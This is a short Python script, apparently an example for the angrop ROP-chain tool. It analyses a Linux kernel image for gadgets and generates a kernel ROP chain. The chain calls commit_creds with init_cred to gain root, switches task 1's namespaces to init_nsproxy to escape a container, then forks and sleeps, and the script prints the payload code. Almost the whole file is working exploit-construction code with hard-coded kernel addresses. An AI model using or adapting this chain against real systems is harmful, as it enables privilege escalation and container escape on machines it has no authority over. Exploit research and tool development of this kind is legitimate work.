"""
On my 16-core machine, it takes:
404s to analyze the gadgets
10s to optimize the graph
0.7s to generate the chain

"""
import os
import time
import logging
from multiprocessing import cpu_count

import angr
import angrop # pylint: disable=unused-import

logging.getLogger("cle.backends.elf.elf").setLevel("ERROR")

proj = angr.Project("./vmlinux_sym")
rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False, max_block_size=12, kernel_mode=True)
cpu_num = cpu_count()

start = time.time()
cache = "/tmp/linux_gadget_cache"
if os.path.exists(cache):
    rop.load_gadgets(cache, optimize=False)
else:
    rop.find_gadgets(processes=cpu_num, optimize=False)
    rop.save_gadgets(cache)
print("gadget finding time:", time.time() - start)

start = time.time()
rop.optimize(processes=cpu_num)
print("graph optimization time:", time.time() - start)

init_cred = 0xffffffff8368b220
init_nsproxy = 0xffffffff8368ad00
start = time.time()
chain = rop.func_call("commit_creds", [init_cred]) + \
        rop.func_call("find_task_by_vpid", [1]) + \
        rop.move_regs(rdi='rax') + \
        rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) + \
        rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) + \
        rop.func_call('__x64_sys_fork', []) + \
        rop.func_call('msleep', [0xffffffff])
print("chain generation time:", time.time() - start)

chain.pp()
chain.print_payload_code()
